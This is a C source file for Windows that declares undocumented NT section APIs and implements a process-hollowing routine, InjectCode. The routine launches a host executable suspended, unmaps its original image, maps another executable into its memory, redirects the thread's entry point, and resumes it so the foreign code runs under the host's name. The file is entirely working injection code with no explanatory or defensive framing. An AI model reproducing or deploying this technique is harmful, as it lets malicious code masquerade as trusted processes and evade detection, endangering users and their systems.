#include <windows.h>
#include <winternl.h>

NTSTATUS
NTAPI
NtCreateSection(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG SectionPageProtection,
    _In_ ULONG AllocationAttributes,
    _In_opt_ HANDLE FileHandle
);

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

NTSTATUS
NTAPI
NtMapViewOfSection(
    _In_ HANDLE SectionHandle,
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*ViewSize) _Writable_bytes_(*ViewSize) _Post_readable_byte_size_(*ViewSize)) PVOID *BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _In_ SIZE_T CommitSize,
    _Inout_opt_ PLARGE_INTEGER SectionOffset,
    _Inout_ PSIZE_T ViewSize,
    _In_ SECTION_INHERIT InheritDisposition,
    _In_ ULONG AllocationType,
    _In_ ULONG Win32Protect
);

NTSTATUS
NTAPI
NtUnmapViewOfSection(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID  BaseAddress
);

NTSTATUS
NTAPI
NtResumeProcess(
    _In_ HANDLE ProcessHandle
);

void InjectCode(LPCWSTR szHostExe, LPCWSTR szInjectedFile) {
    HANDLE hf_host = NULL;
    HANDLE hsec_host = NULL;

    HANDLE hf_injected = NULL;
    HANDLE hsec_injected = NULL;
    PVOID pb_injected = NULL;
    SIZE_T sz_injected = 0;
    PIMAGE_NT_HEADERS nthdr_injected = NULL;

    hf_host = CreateFileW(szHostExe, GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    NtCreateSection(&hsec_host, SECTION_ALL_ACCESS, NULL, NULL, PAGE_EXECUTE_WRITECOPY, SEC_IMAGE, hf_host);

    hf_injected = CreateFileW(szInjectedFile, GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    NtCreateSection(&hsec_injected, SECTION_ALL_ACCESS, NULL, NULL, PAGE_EXECUTE_WRITECOPY, SEC_IMAGE, hf_injected);

    NtMapViewOfSection(hsec_injected, GetCurrentProcess(), &pb_injected, 0, 0, NULL, &sz_injected, ViewUnmap, 0, PAGE_EXECUTE_WRITECOPY);
    nthdr_injected = (PIMAGE_NT_HEADERS)((PBYTE)pb_injected + ((PIMAGE_DOS_HEADER)pb_injected)->e_lfanew);

    PROCESS_INFORMATION pi;
    STARTUPINFOW si = { sizeof(STARTUPINFO) };
    CreateProcessW(szHostExe, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    CONTEXT context = { .ContextFlags = CONTEXT_INTEGER };
    GetThreadContext(pi.hThread, &context);

    PPEB peb = (PPEB)context.Ebx;
    PVOID image_base;

    ReadProcessMemory(pi.hProcess, (PBYTE)(&peb->Ldr) - sizeof(PVOID), &image_base, sizeof(PVOID), NULL);
    NtUnmapViewOfSection(pi.hProcess, image_base);

    NtMapViewOfSection(hsec_injected, pi.hProcess, &image_base, 0, 0, NULL, &sz_injected, ViewUnmap, 0, PAGE_EXECUTE_WRITECOPY);

    context.Eax = (DWORD)((PBYTE)image_base + nthdr_injected->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &context);

    NtResumeProcess(pi.hProcess);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    NtClose(hsec_injected);
    CloseHandle(hf_injected);

    NtClose(hsec_host);
    CloseHandle(hf_host);
}
